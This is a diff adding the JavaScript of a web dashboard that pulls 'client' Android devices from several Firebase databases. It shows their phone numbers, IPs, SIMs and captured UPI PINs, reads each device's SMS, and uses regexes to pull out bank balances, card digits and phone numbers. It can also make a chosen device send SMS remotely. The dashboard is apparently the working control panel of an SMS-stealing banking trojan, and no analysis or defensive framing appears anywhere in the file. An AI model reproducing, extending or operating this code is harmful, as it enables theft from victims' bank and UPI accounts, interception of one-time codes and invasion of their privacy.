+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function getDeviceName(d) {
+            return d.modelName || d.model || d.deviceName || d.name || d.id || 'Unknown';
+        }
+
+        function getPhoneNumber(d) {
+            const sims = d.sims || [];
+            if (sims.length > 0 && sims[0].phoneNumber) return sims[0].phoneNumber;
+            return d.mobNo || d.phone || d.number || '—';
+        }
+
+        function getAndroidVersion(d) {
+            return d.androidV || d.androidVersion || d.sdkV || '—';
+        }
+
+        function getBattery(d) {
+            return d.battery || d.batteryLevel || d.battery_percent || '—';
+        }
+
+        function getStatus(d) {
+            return d.status === true || d.status === 'true' || d.status === 1 || d.status === 'online';
+        }
+
+        function getBankBalances(d) {
+            const analysis = d.smsAnalysis || d.analysis || {};
+            return analysis.bankBalances || [];
+        }
+
+        function getCards(d) {
+            const analysis = d.smsAnalysis || d.analysis || {};
+            return analysis.cards || [];
+        }
+
+        function getPhoneNumbersFromSms(d) {
+            const analysis = d.smsAnalysis || d.analysis || {};
+            return analysis.phoneNumbers || [];
+        }
+
+        function getNetworksFromSms(d) {
+            const analysis = d.smsAnalysis || d.analysis || {};
+            return analysis.networks || [];
+        }
+
+        function formatTime(ts) {
+            if (!ts) return '';
+            const d = typeof ts === 'number' ? new Date(ts) : new Date(ts);
+            if (isNaN(d.getTime())) return '';
+            return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+
+        function analyzeSms(messages) {
+            const bankBalances = [];
+            const cards = [];
+            const phoneNumbers = [];
+            const networks = [];
+            for (const msg of messages) {
+                const text = msg.text || '';
+                const balMatch = text.match(/(?:Avl|Bal|Available)\s*(?:Bal|Balance)?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i) ||
+                    text.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:Avl|Bal|Balance)/i);
+                if (balMatch) {
+                    const bankName = text.match(/HDFC|SBI|ICICI|AXIS|KOTAK|PNB|BOI|CANARA|UNION|YES|IDBI|INDUS|FEDERAL|RBL|PAYTM|PHONEPE|GPAY/i);
+                    bankBalances.push({
+                        bankName: bankName ? bankName[0] : 'Bank',
+                        availableBalance: balMatch[1].replace(/,/g, ''),
+                        transactionType: text.includes('credit') ? 'credit' : text.includes('debit') ? 'debit' : null,
+                        transactionAmount: null,
+                        rawSms: text.substring(0, 120)
+                    });
+                }
+                const cardMatch = text.match(/card[\s:]*([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i) ||
+                    text.match(/[xX*]{4,}([0-9]{4})/);
+                if (cardMatch) {
+                    cards.push({
+                        cardLast4: cardMatch[1].replace(/\s/g, '').slice(-4),
+                        cardType: text.match(/VISA|MASTER|RUPAY|AMEX/i) ? text.match(/VISA|MASTER|RUPAY|AMEX/i)[0] : 'Card',
+                        rawSms: text.substring(0, 100)
+                    });
+                }
+                const phoneMatch = text.match(/(\+91[-\s]?[6-9][0-9]{9})|([6-9][0-9]{9})/);
+                if (phoneMatch) {
+                    let num = phoneMatch[0].replace(/[^0-9]/g, '');
+                    if (num.length === 10 && (num.startsWith('6') || num.startsWith('7') || num.startsWith('8') || num.startsWith('9'))) {
+                        if (!phoneNumbers.includes(num)) phoneNumbers.push(num);
+                    }
+                }
+                const netMatch = text.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi/i);
+                if (netMatch) {
+                    const net = netMatch[0];
+                    if (!networks.includes(net)) networks.push(net);
+                }
+            }
+            return { bankBalances, cards, phoneNumbers, networks };
+        }
+
+        async function fetchAllDevices(silent = false) {
+            if (!silent) {
+                devicesContainer.innerHTML =
+                    `<div class="loading-state"><div class="spinner"></div><div>Merging ${FINAL_URLS.length} databases...</div></div>`;
+                setGlobalStatus(false, 'Loading...');
+            }
+
+            const allDevices = [];
+            const errors = [];
+            const batchSize = 8;
+
+            for (let i = 0; i < FINAL_URLS.length; i += batchSize) {
+                const batch = FINAL_URLS.slice(i, i + batchSize);
+                const promises = batch.map(url => {
+                    const cleanUrl = url.replace(/\/$/, '');
+                    const fetchUrl = `${cleanUrl}/clients.json?auth=${encodeURIComponent(FIREBASE_SECRET)}`;
+                    return fetch(fetchUrl)
+                        .then(res => {
+                            if (!res.ok) {
+                                if (res.status === 401 || res.status === 403) throw new Error(`Auth fail for ${cleanUrl}`);
+                                if (res.status === 404) throw new Error(`DB not found ${cleanUrl}`);
+                                throw new Error(`HTTP ${res.status} ${cleanUrl}`);
+                            }
+                            return res.json().then(data => ({ url: cleanUrl, data }));
+                        })
+                        .catch(err => ({ url: cleanUrl, error: err.message }));
+                });
+
+                const results = await Promise.allSettled(promises);
+                for (const result of results) {
+                    if (result.status === 'fulfilled') {
+                        const val = result.value;
+                        if (val.error) {
+                            errors.push(`❌ ${val.url}: ${val.error}`);
+                            continue;
+                        }
+                        if (!val.data || typeof val.data !== 'object') continue;
+                        const sourceTag = val.url.replace(/https?:\/\//, '').replace(/\.firebaseio\.com.*/, '').replace(/\.firebasedatabase\.app.*/, '').substring(0, 12);
+                        for (const [id, device] of Object.entries(val.data)) {
+                            if (typeof device !== 'object' || device === null) continue;
+                            const sims = device.sims || [];
+                            allDevices.push({
+                                id: id,
+                                _sourceUrl: val.url,
+                                _sourceTag: sourceTag,
+                                modelName: device.modelName || device.model || device.deviceName || device.name || id,
+                                androidV: device.androidV || device.androidVersion || device.sdkV || '—',
+                                battery: device.battery || device.batteryLevel || device.battery_percent || '—',
+                                status: device.status === true || device.status === 'true' || device.status === 1 || device.status === 'online',
+                                mobNo: sims.length > 0 ? sims[0].phoneNumber : device.mobNo || device.phone || device.number || '—',
+                                sims: sims,
+                                smsAnalysis: device.smsAnalysis || device.analysis || {},
+                                lastSeen: device.lastSeen || device.last_seen || device.timestamp || device.updatedAt || device.updated_at || null,
+                                upipin: device.upipin || null,
+                                ip: device.ip_address || device.ip || '—',
+                                storage: device.storage || '—',
+                                cpu: device.cpu_arch || '—',
+                                sdk: device.sdkV || '—',
+                                network: device.network || null,
+                            });
+                        }
+                    } else {
+                        errors.push(`⚠️ Batch error: ${result.reason}`);
+                    }
+                }
+            }
+
+            devices = allDevices;
+            if (errors.length > 0 && !silent) console.warn('Fetch errors:', errors);
+
+            if (!silent) {
+                if (devices.length === 0 && errors.length > 0) {
+                    setGlobalStatus(false, 'Error');
+                    devicesContainer.innerHTML =
+                        `<div class="empty-state"><div class="icon">⚠️</div><div>${errors.slice(0,3).join('<br>')}</div></div>`;
+                } else {
+                    setGlobalStatus(true, `Merged ${devices.length} devices`);
+                    updateStatsAndTabs();
+                    applyFilter(false);
+                }
+            } else {
+                updateStatsAndTabs();
+                applyFilter(true);
+            }
+
+            if (!devicesInterval) {
+                devicesInterval = setInterval(() => fetchAllDevices(true), 35000);
+            }
+
+            if (selectedDevice) {
+                await fetchDeviceSms(selectedDevice.id, selectedDevice._sourceUrl, true);
+                renderDetail(selectedDevice);
+            }
+        }
+
+        async function fetchDeviceSms(deviceId, sourceUrl, silent = false) {
+            if (!sourceUrl || !FIREBASE_SECRET) return;
+            const cleanUrl = sourceUrl.replace(/\/$/, '');
+            const url = `${cleanUrl}/messages/${deviceId}.json?auth=${encodeURIComponent(FIREBASE_SECRET)}&orderBy="$key"&limitToLast=60`;
+            try {
+                const resp = await fetch(url);
+                if (!resp.ok) return;
+                const data = await resp.json();
+                if (!data || typeof data !== 'object') { smsMessages = []; return; }
+                smsMessages = Object.values(data)
+                    .filter(m => m && typeof m === 'object' && (m.message || m.text || m.body))
+                    .map(m => ({
+                        text: m.message || m.text || m.body || '',
+                        sender: m.sender || m.from || 'Unknown',
+                        time: m.dateTime || m.date || m.timestamp || ''
+                    }))
+                    .reverse();
+                const analysis = analyzeSms(smsMessages);
+                smsAnalysis = analysis;
+                return analysis;
+            } catch {
+                smsMessages = [];
+                return null;
+            }
+        }
+
+        function updateStatsAndTabs() {
+            const total = devices.length;
+            const online = devices.filter(d => d.status).length;
+            const offline = total - online;
+            let bankCount = 0, cardCount = 0;
+            devices.forEach(d => {
+                if (getBankBalances(d).length > 0) bankCount++;
+                if (getCards(d).length > 0) cardCount++;
+            });
+            statTotal.textContent = total;
+            statOnline.textContent = online;
+            statOffline.textContent = offline;
+            statBank.textContent = bankCount;
+            statCard.textContent = cardCount;
+            tabAllCount.textContent = total;
+            tabOnlineCount.textContent = online;
+            tabOfflineCount.textContent = offline;
+            tabBankCount.textContent = bankCount;
+            tabCardCount.textContent = cardCount;
+        }
+
+        function applyFilter(silent = false) {
+            let filtered = devices;
+            if (currentTab === 'online') filtered = devices.filter(d => d.status);
+            else if (currentTab === 'offline') filtered = devices.filter(d => !d.status);
+            else if (currentTab === 'bank') filtered = devices.filter(d => getBankBalances(d).length > 0);
+            else if (currentTab === 'card') filtered = devices.filter(d => getCards(d).length > 0);
+            filteredDevices = filtered;
+            renderDevices(filtered, silent);
+        }
+
+        function renderDevices(list, silent = false) {
+            if (list.length === 0) {
+                devicesContainer.innerHTML =
+                    `<div class="empty-state"><div class="icon">📱</div><div>No devices in this category</div></div>`;
+                return;
+            }
+            let html = '<div class="device-grid">';
+            list.forEach(device => {
+                const name = getDeviceName(device);
+                const phone = getPhoneNumber(device);
+                const android = getAndroidVersion(device);
+                const batteryRaw = getBattery(device);
+                const { percent, label } = parseBattery(batteryRaw);
+                const isOnline = getStatus(device);
+                const bankBalances = getBankBalances(device);
+                const cards = getCards(device);
+                const lastSeen = device.lastSeen ? formatTime(device.lastSeen) : '';
+                const networks = getNetworksFromSms(device);
+                const network = networks.length > 0 ? networks[0] : device.network || '—';
+                const sourceTag = device._sourceTag || '';
+
+                const dotClass = isOnline ? 'online' : 'offline';
+                const labelClass = isOnline ? 'online' : 'offline';
+
+                html += `
+                    <div class="device-card" data-device-id="${escapeHtml(device.id)}" data-source="${escapeHtml(device._sourceUrl || '')}">
+                        <div class="top">
+                            <span class="name">${escapeHtml(name)}</span>
+                            <span class="source-tag">${escapeHtml(sourceTag)}</span>
+                        </div>
+                        <div class="id">${escapeHtml(device.id)}</div>
+                        <div class="info-grid">
+                            <span class="lbl">Status</span>
+                            <span><span class="status-dot ${dotClass}"></span><span class="status-label ${labelClass}">${isOnline ? 'Online' : 'Offline'}</span></span>
+                            <span class="lbl">Android</span>
+                            <span class="val">${escapeHtml(android)}</span>
+                            <span class="lbl">Battery</span>
+                            <span class="val" style="color:${getStatusColor(percent)}">${escapeHtml(label)}</span>
+                            <span class="lbl">Number</span>
+                            <span class="val mono">${escapeHtml(phone)}</span>
+                            <span class="lbl">Network</span>
+                            <span class="val">${escapeHtml(network)}</span>
+                            ${lastSeen ? `<span class="lbl">Last seen</span><span class="val" style="font-size:11px;color:#64748b;">${escapeHtml(lastSeen)}</span>` : ''}
+                        </div>
+                        <div class="battery-bar">
+                            <div class="fill" style="width:${percent}%;background:${getStatusColor(percent)};"></div>
+                        </div>
+                        <div class="tags">
+                            ${bankBalances.length > 0 ? `<span class="tag bank">🏦 Bank ${bankBalances.length}</span>` : ''}
+                            ${cards.length > 0 ? `<span class="tag card">💳 Card ${cards.length}</span>` : ''}
+                            ${device.upipin ? `<span class="tag upi">🔑 UPI</span>` : ''}
+                        </div>
+                        ${bankBalances.length > 0 ? `
+                        <div class="bank-preview">
+                            ${bankBalances.slice(0,1).map(b => `
+                                <div class="row">
+                                    <span class="bnk">${escapeHtml(b.bankName || 'Bank')}</span>
+                                    <span class="bal">₹${escapeHtml(b.availableBalance || '0')}</span>
+                                </div>
+                            `).join('')}
+                            ${bankBalances.length > 1 ? `<div style="font-size:9px;color:#475569;text-align:right;margin-top:2px;">+${bankBalances.length-1} more</div>` : ''}
+                        </div>` : ''}
+                        ${cards.length > 0 ? `
+                        <div class="card-preview">
+                            ${cards.slice(0,2).map(c => `•• ${escapeHtml(c.cardLast4 || '')} ${escapeHtml(c.cardType || '')}`).join(' ')}
+                            ${cards.length > 2 ? `+${cards.length-2}` : ''}
+                        </div>` : ''}
+                    </div>
+                `;
+            });
+            html += '</div>';
+            devicesContainer.innerHTML = html;
+
+            document.querySelectorAll('.device-card').forEach(el => {
+                el.addEventListener('click', function() {
+                    const id = this.dataset.deviceId;
+                    const source = this.dataset.source;
+                    const device = devices.find(d => d.id === id && d._sourceUrl === source);
+                    if (device) openDetail(device);
+                });
+            });
+        }
+
+        async function openDetail(device) {
+            selectedDevice = device;
+            detailTab = 'info';
+            smsMessages = [];
+            smsAnalysis = { bankBalances: [], cards: [], phoneNumbers: [], networks: [] };
+            if (device._sourceUrl) {
+                await fetchDeviceSms(device.id, device._sourceUrl, true);
+            }
+            renderDetail(device);
+            detailContainer.style.display = 'block';
+            if (detailSmsInterval) clearInterval(detailSmsInterval);
+            detailSmsInterval = setInterval(async () => {
+                if (selectedDevice && selectedDevice._sourceUrl) {
+                    await fetchDeviceSms(selectedDevice.id, selectedDevice._sourceUrl, true);
+                    renderDetail(selectedDevice);
+                }
+            }, 60000);
+        }
+
+        function closeDetail() {
+            if (detailSmsInterval) { clearInterval(detailSmsInterval); detailSmsInterval = null; }
+            const panel = document.querySelector('.detail-panel');
+            if (panel) panel.classList.add('slide-out');
+            const overlay = document.querySelector('.detail-overlay');
+            if (overlay) overlay.classList.add('closing');
+            setTimeout(() => {
+                detailContainer.innerHTML = '';
+                detailContainer.style.display = 'none';
+                selectedDevice = null;
+            }, 250);
+        }
+
+        function switchTab(tab) {
+            detailTab = tab;
+            if (selectedDevice) renderDetail(selectedDevice);
+        }
+
+        function renderDetail(device) {
+            const isOnline = getStatus(device);
+            const name = getDeviceName(device);
+            const phone = getPhoneNumber(device);
+            const android = getAndroidVersion(device);
+            const batteryRaw = getBattery(device);
+            const { percent, label } = parseBattery(batteryRaw);
+            const ip = device.ip || '—';
+            const storage = device.storage || '—';
+            const cpu = device.cpu || '—';
+            const sdk = device.sdk || '—';
+            const sims = device.sims || [];
+            const upipin = device.upipin || null;
+            const lastSeen = device.lastSeen ? formatTime(device.lastSeen) : '';
+            const bankBalances = smsAnalysis.bankBalances || getBankBalances(device);
+            const cards = smsAnalysis.cards || getCards(device);
+            const phoneNumbers = smsAnalysis.phoneNumbers || getPhoneNumbersFromSms(device);
+            const networks = smsAnalysis.networks || getNetworksFromSms(device);
+
+            let infoHtml = `
+                <div class="section-label">Device</div>
+                <div class="info-row"><span class="lbl">Phone</span><span class="val mono highlight">${escapeHtml(phone)}</span></div>
+                <div class="info-row"><span class="lbl">Network</span><span class="val">${networks.length > 0 ? escapeHtml(networks.join(', ')) : '—'}</span></div>
+                <div class="info-row"><span class="lbl">Android</span><span class="val">${escapeHtml(android)}</span></div>
+                <div class="info-row"><span class="lbl">IP</span><span class="val mono">${escapeHtml(ip)}</span></div>
+                <div class="info-row"><span class="lbl">Storage</span><span class="val">${escapeHtml(storage)}</span></div>
+                <div class="info-row"><span class="lbl">CPU</span><span class="val mono">${escapeHtml(cpu)}</span></div>
+                <div class="info-row"><span class="lbl">SDK</span><span class="val">${escapeHtml(sdk)}</span></div>
+                <div class="info-row"><span class="lbl">SIMs</span><span class="val">${sims.length} SIM(s)</span></div>
+                ${upipin ? `<div class="info-row"><span class="lbl">UPI PIN</span><span class="val highlight">${escapeHtml(upipin)}</span></div>` : ''}
+                ${lastSeen ? `<div class="info-row"><span class="lbl">Last Seen</span><span class="val" style="font-size:12px;color:#64748b;">${escapeHtml(lastSeen)}</span></div>` : ''}
+                ${device._sourceTag ? `<div class="info-row"><span class="lbl">Source</span><span class="val" style="font-size:11px;color:#00f0ff;">${escapeHtml(device._sourceTag)}</span></div>` : ''}
+                ${device.id ? `<div class="info-row"><span class="lbl">Device ID</span><span class="val mono" style="font-size:11px;">${escapeHtml(device.id)}</span></div>` : ''}
+            `;
+            if (phoneNumbers.length > 0) {
+                infoHtml += `<div class="section-label">Extracted from SMS</div>`;
+                phoneNumbers.slice(0, 5).forEach((num, idx) => {
+                    infoHtml += `<div class="info-row"><span class="lbl">Phone #${idx+1}</span><span class="val mono highlight">${escapeHtml(num)}</span></div>`;
+                });
+                networks.slice(0, 5).forEach((net, idx) => {
+                    infoHtml += `<div class="info-row"><span class="lbl">Network #${idx+1}</span><span class="val">${escapeHtml(net)}</span></div>`;
+                });
+            }
+
+            let bankHtml = '';
+            if (bankBalances.length === 0) {
+                bankHtml = `<div class="empty-state" style="padding:20px 0;"><div class="icon">🏦</div><div>No bank SMS detected</div></div>`;
+            } else {
+                bankBalances.forEach(b => {
+                    bankHtml += `
+                        <div class="detail-bank-item">
+                            <div class="row">
+                                <span class="bnk">${escapeHtml(b.bankName || 'Bank')}</span>
+                                <span class="bal">₹${escapeHtml(b.availableBalance || '0')}</span>
+                            </div>
+                            ${b.transactionAmount ? `<div class="sub">${b.transactionType === 'credit' ? '➕ Credit' : '➖ Debit'} ₹${escapeHtml(b.transactionAmount)}</div>` : ''}
+                            ${b.rawSms ? `<div class="sub" style="color:#475569;font-size:10px;margin-top:4px;">${escapeHtml(b.rawSms)}</div>` : ''}
+                        </div>
+                    `;
+                });
+            }
+
+            let smsHtml = '';
+            if (smsMessages.length === 0) {
+                smsHtml = `<div class="empty-state" style="padding:20px 0;"><div class="icon">💬</div><div>No SMS</div></div>`;
+            } else {
+                smsMessages.forEach(msg => {
+                    smsHtml += `
+                        <div class="sms-item">
+                            <div class="sms-header">
+                                <span>${escapeHtml(msg.sender)}</span>
+                                <span>${escapeHtml(msg.time)}</span>
+                            </div>
+                            <div class="sms-body">${escapeHtml(msg.text)}</div>
+                        </div>
+                    `;
+                });
+            }
+
+            const sendHtml = `
+                <div class="send-form">
+                    <label style="font-size:11px;color:#64748b;font-weight:600;">Select SIM</label>
+                    <div class="sim-selector">
+                        ${[1,2].map(sim => `
+                            <button class="${simSelected === sim ? 'active' : ''}" data-sim="${sim}">SIM ${sim}</button>
+                        `).join('')}
+                    </div>
+                    <input type="text" id="sendNumber" placeholder="Recipient (e.g., +919876543210)" value="${escapeHtml(phone !== '—' ? phone : '')}" />
+                    <textarea id="sendMessage" placeholder="Type message..."></textarea>
+                    <button class="btn-send" id="sendBtn">📨 Send</button>
+                </div>
+            `;
+
+            const tabs = [
+                { key: 'info', label: 'Info' },
+                { key: 'bank', label: `Bank (${bankBalances.length})` },
+                { key: 'sms', label: `SMS (${smsMessages.length})` },
+                { key: 'send', label: 'Send' }
+            ];
+            let tabsHtml = tabs.map(t =>
+                `<button class="${detailTab === t.key ? 'active' : ''}" data-tab="${t.key}">${t.label}</button>`
+            ).join('');
+
+            let contentHtml = '';
+            if (detailTab === 'info') contentHtml = infoHtml;
+            else if (detailTab === 'bank') contentHtml = bankHtml;
+            else if (detailTab === 'sms') contentHtml = smsHtml;
+            else if (detailTab === 'send') contentHtml = sendHtml;
+
+            const html = `
+                <div class="detail-overlay" id="detailOverlay">
+                    <div class="detail-panel" id="detailPanel">
+                        <div class="detail-header">
+                            <div class="left">
+                                <span class="name">${escapeHtml(name)}</span>
+                                <span class="st" style="color:${isOnline ? '#22c55e' : '#475569'}">${isOnline ? '● Online' : '○ Offline'}</span>
+                                <span style="font-size:11px;color:#64748b;margin-left:4px;">${escapeHtml(label)}</span>
+                            </div>
+                            <button class="close-btn" id="detailCloseBtn">✕</button>
+                        </div>
+                        <div class="detail-tabs">${tabsHtml}</div>
+                        <div class="detail-content">${contentHtml}</div>
+                    </div>
+                </div>
+            `;
+
+            detailContainer.innerHTML = html;
+
+            document.getElementById('detailCloseBtn')?.addEventListener('click', closeDetail);
+            document.getElementById('detailOverlay')?.addEventListener('click', function(e) {
+                if (e.target === this) closeDetail();
+            });
+            document.querySelectorAll('.detail-tabs button').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    switchTab(this.dataset.tab);
+                });
+            });
+            document.querySelectorAll('.sim-selector button')?.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.sim-selector button').forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    simSelected = parseInt(this.dataset.sim);
+                });
+            });
+            document.getElementById('sendBtn')?.addEventListener('click', sendSms);
+        }
+
+        async function sendSms() {
+            if (!selectedDevice || !selectedDevice._sourceUrl || !FIREBASE_SECRET) return;
+            const number = document.getElementById('sendNumber')?.value.trim();
+            const message = document.getElementById('sendMessage')?.value.trim();
+            if (!number || !message) { alert('Enter recipient and message.'); return; }
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+            try {
+                const cleanUrl = selectedDevice._sourceUrl.replace(/\/$/, '');
+                const url = `${cleanUrl}/clients/${selectedDevice.id}/webhookEvent/sendSms.json?auth=${encodeURIComponent(FIREBASE_SECRET)}`;
+                const resp = await fetch(url, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ from: simSelected, to: number, message, isSended: false })
+                });
+                if (!resp.ok) throw new Error('Send failed');
+                alert('✅ SMS queued!');
+                document.getElementById('sendMessage').value = '';
+            } catch (err) {
+                alert('❌ ' + err.message);
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '📨 Send';
+            }
+        }
+
+        tabContainer.addEventListener('click', function(e) {
+            const btn = e.target.closest('button');
+            if (!btn) return;
+            const tab = btn.dataset.tab;
+            if (!tab) return;
+            document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentTab = tab;
+            applyFilter(true);
+        });
+
+        function logout() {
+            devices = [];
+            filteredDevices = [];
+            isConnected = false;
+            selectedDevice = null;
+            if (devicesInterval) { clearInterval(devicesInterval); devicesInterval = null; }
+            if (detailSmsInterval) { clearInterval(detailSmsInterval); detailSmsInterval = null; }
+            if (detailContainer.style.display !== 'none') closeDetail();
+            setGlobalStatus(false, 'Logged out');
+            devicesContainer.innerHTML =
+                `<div class="loading-state"><div class="spinner"></div><div>Reconnecting...</div></div>`;
+            statTotal.textContent = '0';
+            statOnline.textContent = '0';
+            statOffline.textContent = '0';
+            statBank.textContent = '0';
+            statCard.textContent = '0';
+            tabAllCount.textContent = '0';
+            tabOnlineCount.textContent = '0';
+            tabOfflineCount.textContent = '0';
+            tabBankCount.textContent = '0';
+            tabCardCount.textContent = '0';
+            document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
+            document.querySelector('[data-tab="all"]').classList.add('active');
+            currentTab = 'all';
+            setTimeout(() => fetchAllDevices(false), 300);
+            console.log('🔓 Reset done.');
+        }
+
+        document.getElementById('logoutBtn')?.addEventListener('click', logout);
+
+        // ======================================================================
+        // AUTO-START
+        // ======================================================================
+        window.onload = function() {
+            fetchAllDevices(false);
+        };
+    </script>
+</body>
+</html>
